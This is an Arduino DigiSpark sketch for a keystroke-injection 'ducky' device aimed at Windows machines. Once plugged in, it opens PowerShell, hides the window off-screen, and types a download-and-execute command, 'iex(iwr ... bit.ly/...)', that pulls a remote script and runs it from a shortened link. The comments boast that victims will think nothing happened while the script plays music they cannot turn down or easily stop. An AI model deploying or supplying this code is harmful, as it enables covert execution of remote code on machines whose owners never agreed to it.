#include "DigiKeyboard.h"

void setup() { // The code goes inside setup since it should only run once.

  // Init LED and wait for ducky to init
  pinMode(1, OUTPUT);
  DigiKeyboard.delay(300);

  // Open Powershell
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboard.println("powershell");
  DigiKeyboard.delay(200);

  // Hide the Powershell window while keeping keyboard focus
  DigiKeyboard.println("[console]::WindowHeight=1;[console]::WindowWidth=1");
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_ALT_LEFT);
  DigiKeyboard.sendKeyStroke(KEY_M);
  
  for (int i = 0; i < 16; i++) DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);


  // Download the launcher for the rest of the script
  // We use a launcher instead of typing the command since it's shorter, and like that the ducky can be removed faster. 
  DigiKeyboard.println("iex(iwr -usebasicparsing bit.ly/2WU9Dme)");


  
  // All done, turn on LED so you know you can unplug it
  DigiKeyboard.delay(100);
  digitalWrite(1, HIGH);

  // Since everything is done inside the PS script, the ducky can be unplugged now and the script will keep running. 
  // People will only see a flashing PowerShell window, so they'll think nothing happened to their machine. However,
  // the script is actually running in the background and runs itself after 30 seconds. 
  
  // Furthermore, since there's no tray icon, people will have to either turn off their computer to stop the music,
  // the script prevents you from turning down the volume (!), or kill the PowerShell script through Task Manager.
}

void loop() { } // Nothing